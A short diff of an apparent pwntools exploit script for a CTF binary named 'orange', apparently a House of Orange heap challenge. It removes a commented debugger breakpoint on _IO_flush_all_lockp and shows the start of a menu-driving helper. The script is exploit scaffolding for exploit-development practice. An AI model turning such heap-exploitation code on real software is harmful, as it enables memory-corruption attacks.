@@ -1,6 +1,5 @@
 from pwn import *
 p=process('./orange')
-#attach(p,"b _IO_flush_all_lockp")
 def build(le,nam,pri=10,col=6):
     p.sendlineafter('choice','1')
     p.sendlineafter('Length',str(le))
